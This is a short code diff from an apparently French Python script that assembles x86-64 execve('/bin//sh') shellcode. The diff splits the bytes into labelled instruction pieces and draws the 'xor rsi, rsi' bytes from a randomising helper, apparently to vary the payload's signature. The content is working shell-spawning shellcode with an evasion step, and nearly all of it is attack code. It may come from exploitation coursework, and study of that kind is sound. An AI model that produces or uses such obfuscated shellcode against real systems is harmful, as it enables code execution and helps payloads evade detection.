@@ -7,8 +7,21 @@ def partie6():
         '\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05'
     ]
 
+
+    xorrsi = randomxor('rsi') # xor rsi, rsi 
+    pushrsi = "\\x56" 
+    movrdi = "\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68" # mov rdi, 0x68732f2f6e69622f
+    pushrdi = "\\x57" 
+    pushrsp = "\\x54" 
+    poprdi = "\\x5f" 
+    moval = "\\xb0\\x3b" # mov 0x3b,al
+    cdq = "\\x99"
+    syscall = "\\x0f\\x05"
+
+    resultat_concat = xorrsi + pushrsi + movrdi + pushrdi + pushrsp + poprdi + moval + cdq + syscall
+    print("Part 6 = ", resultat_concat)
+
     """
-    
     ; part 6
 	xor rsi, rsi
 	push rsi
@@ -25,4 +38,4 @@ def partie6():
     #print("Partie 6 : ",part6)
     #print(" ")
 
-    return part6
+    return resultat_concat
